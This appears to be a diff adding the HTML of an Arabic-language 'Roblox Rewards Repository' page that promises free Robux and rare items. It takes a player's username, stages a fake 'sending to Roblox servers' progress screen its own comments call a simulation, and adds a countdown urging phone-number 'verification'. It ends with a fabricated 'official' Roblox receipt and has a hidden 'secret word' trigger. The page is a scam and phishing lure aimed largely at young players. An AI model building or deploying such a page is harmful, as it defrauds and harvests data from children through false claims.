@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>مستودع مكافآت روبلوكس الرسمية | Roblox Rewards Repository</title>
+    <!-- Google Fonts: Cairo -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <!-- ==================== المرحلة الأولى: شاشة التحميل (SPLASH SCREEN) ==================== -->
+    <div id="splash-screen" class="splash-screen">
+        <div class="splash-content">
+            <img src="Roplox_name.png" alt="Roblox" class="splash-logo">
+        </div>
+    </div>
+
+    <!-- ==================== الهيكل الرئيسي للموقع ==================== -->
+    <div id="app-container" class="app-container hidden">
+
+        <!-- الهيدر العلوي للموقع -->
+        <header class="main-header">
+            <div class="header-content">
+                <!-- الجانب الأيمن: أيقونة روبلوكس + خط رأسي + عنوان الموقع -->
+                <div class="header-brand">
+                    <img src="roblox.png" alt="Roblox" class="header-icon">
+                    <span class="header-divider"></span>
+                    <div class="header-title">مستودع مكافآت<br>روبلوكس</div>
+                </div>
+                <!-- الجانب الأيسر: تاريخ اليوم بصيغة DD/MM/YYYY -->
+                <div class="header-date-box">
+                    <i class="fa-regular fa-calendar-days date-icon"></i>
+                    <span id="current-date" class="date-text">00/00/0000</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- المحتوى الرئيسي -->
+        <main class="main-content">
+
+            <!-- 1. قسم تسجيل اسم حساب روبلوكس -->
+            <section class="account-section">
+                <label for="username-input" class="account-label">
+                    <span class="step-badge">1</span>
+                    <span>اسم المستخدم</span>
+                </label>
+                <div class="account-input-group">
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-user input-icon"></i>
+                        <input type="text" id="username-input" placeholder="اسم المستخدم في Roblox (مثال: Player123)" aria-label="اسم المستخدم في Roblox" autocomplete="off">
+                        <div id="account-status-icon" class="status-icon"></div>
+                    </div>
+                    <button id="register-btn" class="btn btn-login">
+                        <i class="fa-solid fa-right-to-bracket"></i>
+                        <span>دخول</span>
+                    </button>
+                </div>
+                <p id="account-helper-note" class="account-helper-note">تأكد ان تكتب اسم المستخدم الصحيح .</p>
+            </section>
+
+            <!-- الحاوية الديناميكية التي تتحول في المرحلة الثالثة -->
+            <section id="dynamic-stage-container" class="dynamic-stage-container disabled-section">
+
+                <!-- ==================== المرحلة الثانية: اختيار العناصر والنافيجيشن ==================== -->
+                <div id="stage-2-content" class="stage-content">
+
+                    <!-- نافيجيشن التبويب -->
+                    <nav class="rewards-nav">
+                        <button id="tab-robux" class="nav-tab active" data-target="robux">
+                            <img src="rabux.png" alt="Robux Icon" class="tab-icon">
+                            <span>روبوكس (Robux)</span>
+                        </button>
+                        <button id="tab-items" class="nav-tab" data-target="items">
+                            <i class="fa-solid fa-gem tab-icon-fa"></i>
+                            <span>عناصر نادرة</span>
+                        </button>
+                    </nav>
+
+                    <!-- قسم شبكة العناصر (Robux / Items Cards) -->
+                    <div class="cards-viewport">
+
+                        <!-- صفوف اختيارات الروبوكس -->
+                        <div id="robux-grid" class="robux-rows-list active-grid">
+
+                            <div class="reward-card robux-row" data-id="r1" data-name="500 Robux" data-type="robux">
+                                <div class="row-info">
+                                    <img src="rabux.png" alt="Robux" class="row-icon">
+                                    <span class="row-amount">500 Robux</span>
+                                </div>
+                                <div class="row-price-box">
+                                    <span class="old-price">$8.33</span>
+                                    <span class="free-price">$0.0</span>
+                                </div>
+                            </div>
+
+                            <div class="reward-card robux-row" data-id="r2" data-name="1,000 Robux" data-type="robux">
+                                <div class="row-info">
+                                    <img src="rabux.png" alt="Robux" class="row-icon">
+                                    <span class="row-amount">1,000 Robux</span>
+                                </div>
+                                <div class="row-price-box">
+                                    <span class="old-price">$16.66</span>
+                                    <span class="free-price">$0.0</span>
+                                </div>
+                            </div>
+
+                            <div class="reward-card robux-row" data-id="r3" data-name="1,500 Robux" data-type="robux">
+                                <div class="row-info">
+                                    <img src="rabux.png" alt="Robux" class="row-icon">
+                                    <span class="row-amount">1,500 Robux</span>
+                                </div>
+                                <div class="row-price-box">
+                                    <span class="old-price">$25.00</span>
+                                    <span class="free-price">$0.0</span>
+                                </div>
+                            </div>
+
+                            <div class="reward-card robux-row" data-id="r4" data-name="2,000 Robux" data-type="robux">
+                                <div class="row-info">
+                                    <img src="rabux.png" alt="Robux" class="row-icon">
+                                    <span class="row-amount">2,000 Robux</span>
+                                </div>
+                                <div class="row-price-box">
+                                    <span class="old-price">$33.33</span>
+                                    <span class="free-price">$0.0</span>
+                                </div>
+                            </div>
+
+                        </div>
+
+                        <!-- شبكة كروت العناصر النادرة -->
+                        <div id="items-grid" class="cards-grid hidden-grid">
+
+                            <div class="reward-card rare-item" data-id="i1" data-name="Storm X" data-type="item">
+                                <div class="card-image-box">
+                                    <img src="storm-x.jpg" alt="Storm X" class="card-img">
+                                </div>
+                                <div class="card-details">
+                                    <h3 class="card-title">Storm X</h3>
+                                    <div class="card-price-row">
+                                        <span class="old-price">50,000 R$</span>
+                                        <span class="free-price">$0.0</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="reward-card rare-item" data-id="i2" data-name="الأبدية الظلامية" data-type="item">
+                                <div class="card-image-box">
+                                    <img src="elzlaama.jpg" alt="الأبدية الظلامية" class="card-img">
+                                </div>
+                                <div class="card-details">
+                                    <h3 class="card-title">الأبدية الظلامية</h3>
+                                    <div class="card-price-row">
+                                        <span class="old-price">50,000 R$</span>
+                                        <span class="free-price">$0.0</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="reward-card rare-item" data-id="i3" data-name="فالكريا البنفسجية" data-type="item">
+                                <div class="card-image-box">
+                                    <img src="vlkria.jpg" alt="فالكريا البنفسجية" class="card-img">
+                                </div>
+                                <div class="card-details">
+                                    <h3 class="card-title">فالكريا البنفسجية</h3>
+                                    <div class="card-price-row">
+                                        <span class="old-price">50,000 R$</span>
+                                        <span class="free-price">$0.0</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="reward-card rare-item" data-id="i4" data-name="شفرة قلب المحيط" data-type="item">
+                                <div class="card-image-box">
+                                    <img src="shfra.jpg" alt="شفرة قلب المحيط" class="card-img">
+                                </div>
+                                <div class="card-details">
+                                    <h3 class="card-title">شفرة قلب المحيط</h3>
+                                    <div class="card-price-row">
+                                        <span class="old-price">50,000 R$</span>
+                                        <span class="free-price">$0.0</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                    <!-- تنبيه اختيار المكافأة -->
+                    <div id="reward-alert" class="alert-message hidden">
+                        <i class="fa-solid fa-hand-pointer"></i>
+                        <span>يرجى النقر على إحدى البطاقات لاختيار المكافأة قبل الإرسال!</span>
+                    </div>
+
+                    <!-- زر إرسال المكافأة الآن -->
+                    <div class="action-footer">
+                        <button id="send-reward-btn" class="btn btn-send-reward btn-disabled" disabled>
+                            <i class="fa-solid fa-paper-plane"></i>
+                            <span>إرسال المكافأة الآن</span>
+                        </button>
+                    </div>
+
+                </div>
+
+                <!-- ==================== المرحلة الثالثة: جاري الإرسال والتأكيد ==================== -->
+                <div id="stage-3-content" class="stage-content hidden">
+
+                    <!-- شاشة التحميل ومحاكاة الإرسال (تستغرق 5 ثوانٍ) -->
+                    <div id="processing-view" class="processing-view">
+                        <div class="processing-spinner">
+                            <div class="outer-ring"></div>
+                            <img src="rabux.png" alt="Processing" class="spinner-center-icon">
+                        </div>
+                        <h3 class="processing-title">جاري إرسال المكافأة...</h3>
+                        <p class="processing-subtitle">يرجى الانتظار، يتم الآن معالجة طلبك وتوصيله بسيرفرات Roblox</p>
+
+                        <!-- شريط التقدم والسجلات الحية -->
+                        <div class="processing-progress-box">
+                            <div class="progress-bar-container">
+                                <div id="stage3-progress-fill" class="progress-bar-fill green-fill"></div>
+                            </div>
+                            <div class="processing-steps-list">
+                                <div id="step-1" class="proc-step active"><i class="fa-solid fa-spinner fa-spin"></i> التوصيل بالحساب: <span id="proc-username" class="highlight">---</span></div>
+                                <div id="step-2" class="proc-step waiting"><i class="fa-regular fa-clock"></i> تجهيز المكافأة: <span id="proc-reward" class="highlight">---</span></div>
+                                <div id="step-3" class="proc-step waiting"><i class="fa-regular fa-clock"></i> تشفير وتأكيد الحزمة النهائي...</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- شاشة التأكيد النهائية (تظهر بعد الـ 5 ثوانٍ) -->
+                    <div id="confirmation-view" class="confirmation-view hidden">
+                        <div class="confirmation-card">
+
+                            <!-- العنوان العلوي للخطوة النهائية -->
+                            <h2 class="conf-step-title">الخطوة النهائية</h2>
+
+                            <!-- المؤقت التنازلي (3 دقائق) -->
+                            <div class="conf-timer-box">
+                                <i class="fa-regular fa-clock timer-icon"></i>
+                                <span class="timer-label">تنتهي مهلة الحجز خلال:</span>
+                                <span id="countdown-timer" class="timer-digits">03:00</span>
+                            </div>
+
+                            <!-- تفاصيل المستخدم والجائزة -->
+                            <div class="conf-user-reward-box">
+                                <h3 class="conf-welcome-msg">مرحباً، <span id="conf-user-name" class="highlight-green">Player</span></h3>
+                                <p class="conf-reward-msg"><span id="conf-reward-name" class="highlight-gold">10,000 Robux</span> جاهزة للإرسال الآن 🚀</p>
+                            </div>
+
+                            <!-- الوصف البارز والتعليمات -->
+                            <div class="instruction-box">
+                                <i class="fa-solid fa-mobile-screen-button instruction-icon"></i>
+                                <p class="instruction-text">
+                                    اضغط زر التحقق الذي بالاسفل واكمل التحقق برقم هاتفك الان و سوف يتم توجيهك مباشرة الينا مره اخري ليكتمل الشحن لك.
+                                </p>
+                            </div>
+
+                            <!-- زر التحقق الآن -->
+                            <div class="verification-action-box">
+                                <button id="verify-now-btn" class="btn btn-verify">
+                                    <i class="fa-solid fa-shield-halved"></i>
+                                    <span>التحقق الآن</span>
+                                </button>
+                            </div>
+
+                            <!-- الفوتر والحقوق مع الكلمة السرية (مستودع) -->
+                            <div class="conf-secret-footer">
+                                <p>© 2026 جميع الحقوق محفوظة لـ <span id="secret-trigger" class="secret-word">مستودع</span> مكافآت روبلوكس</p>
+                                <span class="ssl-secured"><i class="fa-solid fa-lock"></i> عملية مشفرة وآمنة 100%</span>
+                            </div>
+
+                        </div>
+                    </div>
+
+                    <!-- شاشة نجاح الشحن الاحترافية الفائقة (الفاتورة المعتمدة) -->
+                    <div id="success-invoice-view" class="invoice-view hidden">
+                        <div class="invoice-card">
+
+                            <!-- الهيدر العلوي: أيقونة كبيرة بالمنتصف وننس واضح -->
+                            <div class="invoice-top-status">
+                                <div class="invoice-large-icon">
+                                    <i class="fa-solid fa-circle-check"></i>
+                                </div>
+                                <h2 class="invoice-status-title">تم الشحن بنجاح</h2>
+                                <p class="invoice-status-subtitle">إيصال معتمد ورسمي من سيرفرات Roblox</p>
+                            </div>
+
+                            <!-- الشعار ورقم المعاملة -->
+                            <div class="invoice-meta-bar">
+                                <img src="Roplox_name.png" alt="Roblox" class="invoice-brand-logo">
+                                <div class="invoice-tx-badge">
+                                    <span class="tx-lbl">رقم المعاملة:</span>
+                                    <strong id="inv-tx-id" class="tx-num">#RBX-8942179</strong>
+                                </div>
+                            </div>
+
+                            <!-- جدول المعاملة الاحترافي الدقيق -->
+                            <div class="invoice-table">
+                                <div class="inv-table-header">
+                                    <span>تفاصيل عملية الشحن</span>
+                                    <span class="inv-live-badge"><i class="fa-solid fa-shield-halved"></i> موثق 100%</span>
+                                </div>
+
+                                <div class="inv-table-body">
+                                    <div class="inv-table-row">
+                                        <span class="col-label"><i class="fa-solid fa-user"></i> اسم حساب اللاعب:</span>
+                                        <span id="inv-user" class="col-val user-val">Player</span>
+                                    </div>
+                                    <div class="inv-table-row">
+                                        <span class="col-label"><i class="fa-solid fa-gift"></i> المكافأة المشحونة:</span>
+                                        <span id="inv-item" class="col-val reward-val">10,000 Robux</span>
+                                    </div>
+                                    <div class="inv-table-row">
+                                        <span class="col-label"><i class="fa-solid fa-tag"></i> القيمة الكلية:</span>
+                                        <span class="col-val old-val"><s>$166.66</s></span>
+                                    </div>
+                                    <div class="inv-table-row highlight-row">
+                                        <span class="col-label"><i class="fa-solid fa-circle-dollar-to-slot"></i> المبلغ المدفوع النهائي:</span>
+                                        <span class="col-val free-val">$0.00 (مجاناً 100%)</span>
+                                    </div>
+                                    <div class="inv-table-row">
+                                        <span class="col-label"><i class="fa-regular fa-clock"></i> التاريخ والوقت:</span>
+                                        <span id="inv-date" class="col-val date-val">13/09/2026 - 12:45 PM</span>
+                                    </div>
+                                    <div class="inv-table-row">
+                                        <span class="col-label"><i class="fa-solid fa-server"></i> سيرفر المعالجة:</span>
+                                        <span class="col-val server-val">ROBLOX-LIVE-NODE #04</span>
+                                    </div>
+                                    <div class="inv-table-row">
+                                        <span class="col-label"><i class="fa-solid fa-badge-check"></i> حالة المعاملة:</span>
+                                        <span class="col-val status-val"><i class="fa-solid fa-circle-check"></i> مكتملة وموثقة</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- أزرار الإجراءات السفلية -->
+                            <div class="invoice-footer-actions">
+                                <button type="button" class="btn btn-print-inv" onclick="window.print()">
+                                    <i class="fa-solid fa-print"></i> طباعة الفاتورة
+                                </button>
+                                <button type="button" class="btn btn-reload-inv" onclick="window.location.reload()">
+                                    <i class="fa-solid fa-check"></i> إنهاء ومتابعة
+                                </button>
+                            </div>
+
+                        </div>
+                    </div>
+
+                </div>
+
+            </section>
+
+        </main>
+
+        <!-- الفوتر السفلية -->
+        <footer class="main-footer">
+            <p>© 2026 مستودع مكافآت روبلوكس (Roblox Rewards Repository). جميع الحقوق محفوظة.</p>
+            <p class="disclaimer">هذا الموقع غير تابع رسميًا لشركة Roblox Corporation، وهو مجرد مجتمع ترويجي مكافآت متوافق مع شروط الخدمة.</p>
+        </footer>
+
+    </div>
+
+    <!-- Custom JavaScript -->
+    <script src="app.js"></script>
+</body>
+</html>
